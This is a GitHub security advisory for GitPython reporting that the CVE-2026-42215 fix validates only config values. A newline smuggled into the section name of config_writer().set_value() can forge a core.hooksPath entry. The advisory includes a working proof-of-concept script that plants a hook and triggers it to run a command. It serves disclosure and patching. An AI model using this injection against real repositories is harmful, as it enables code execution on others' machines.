# [H] GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath

## Summary
Severity: High
Advisory: GHSA-mv93-w799-cj2w
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-mv93-w799-cj2w
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=0 <3.1.50

## Details
Summary

The patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.

Details

File: git/config.py — GitPython 3.1.49 (latest patched version)

```python
  def set_value(self, section: str, option: str, value) -> "GitConfigParser":
      value_str = self._value_to_string_safe(value)   # only value is validated
      if not self.has_section(section):
          self.add_section(section)                    # section not validated
      super().set(section, option, value_str)          # option not validated
      return self
```

_write() formats section headers as "[%s]\n" % name. When section = "user]\n[core", this writes [user]\n[core]\n — two valid section headers — into .git/config.

PoC

```python
  import git, os, subprocess

  repo = git.Repo.init("/tmp/bypass_test")

  os.makedirs("/tmp/evil_hooks", exist_ok=True)
  with open("/tmp/evil_hooks/pre-commit", "w") as f:
      f.write("#!/bin/sh\nid > /tmp/rce_proof.txt\n")
  os.chmod("/tmp/evil_hooks/pre-commit", 0o755)

  # Inject newline into section parameter (not value — already patched)
  with repo.config_writer() as cw:
      cw.set_value("user]\n[core", "hooksPath", "/tmp/evil_hooks")

  r = subprocess.run(["git", "-C", "/tmp/bypass_test", "config", "core.hooksPath"],
                     capture_output=True, text=True)
  print(r.stdout.strip())  # → /tmp/evil_hooks

  subprocess.run(["git", "-C", "/tmp/bypass_test", "commit", "--allow-empty", "-m", "x"])
  print(open("/tmp/rce_proof.txt").read())  # → uid=1000(...) RCE confirmed
```

Impact

Same attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w
- https://github.com/advisories/GHSA-rpm5-65cw-6hj4
- https://github.com/gitpython-developers/GitPython
